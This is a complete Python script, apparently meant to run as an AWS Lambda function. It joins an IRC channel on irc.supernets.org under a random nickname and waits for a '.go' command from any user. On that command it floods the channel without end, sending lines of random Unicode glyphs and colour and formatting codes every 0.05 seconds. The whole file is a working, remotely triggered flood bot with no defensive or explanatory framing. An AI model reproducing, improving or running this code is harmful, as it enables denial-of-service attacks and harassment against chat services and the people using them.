#!/usr/bin/env python
import random,socket,ssl,time
def lambda_handler(event, context):
	def raw(msg) : sock.send(bytes(msg + '\r\n', 'utf-8'))
	def rnd(size): return ''.join(random.choices('aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ0123456789', k=size))
	sock = ssl.wrap_socket(socket.socket())
	sock.connect(('irc.supernets.org', 6697))
	raw(f'USER {rnd(5)} 0 * :' + rnd(5))
	raw('NICK ' + rnd(5))
	while True:
		try:
			data = sock.recv(1024).decode('utf-8')
			for line in (line for line in data.split('\r\n') if len(line.split()) >= 2):
				args = line.split()
				if args[0] == 'PING' : raw('PONG ' + args[1][1:])
				elif args[1] == '001':
					time.sleep(3)
					raw('JOIN #dev')
				elif args[1] == 'PRIVMSG' and len(args) == 4:
					msg = ' '.join(args[3:])[1:]
					if msg == '.go':
						curr = 4096
						while True:
							unistr = [chr(item) for item in range(curr,curr+50)]
							sender = ''
							for item in unistr:
								sender = sender + '\x03'+str(random.randint(2,256)) + random.choice(['\x1f','\x02','\x16','']) + item + '\x0f'
							raw('PRIVMSG #dev :' + sender)
							curr = random.randint(4096,1114100)
							time.sleep(0.05)
		except (UnicodeDecodeError,UnicodeEncodeError):
			pass
